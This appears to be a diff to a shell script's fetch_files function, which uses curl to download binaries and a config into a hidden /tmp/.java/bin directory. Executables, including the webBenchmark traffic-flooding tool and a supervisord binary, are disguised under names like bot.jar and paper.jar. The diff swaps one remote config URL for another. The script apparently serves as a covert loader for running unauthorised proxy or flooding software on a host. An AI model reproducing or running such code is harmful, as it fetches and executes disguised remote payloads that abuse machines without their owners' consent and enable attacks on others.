@@ -6,7 +6,7 @@ function fetch_files() {
     cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/gnet-v1.4.43-amd64 -o bot.jar
     cd /tmp/.java/bin/ && curl -L https://github.com/maintell/webBenchmark/releases/download/0.6/webBenchmark_linux_x64 -o paper.jar
     cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
-    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/crosmo/d.conf -o cfg.conf
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/wisp/d.conf -o cfg.conf
 }
 
 function start_app() {
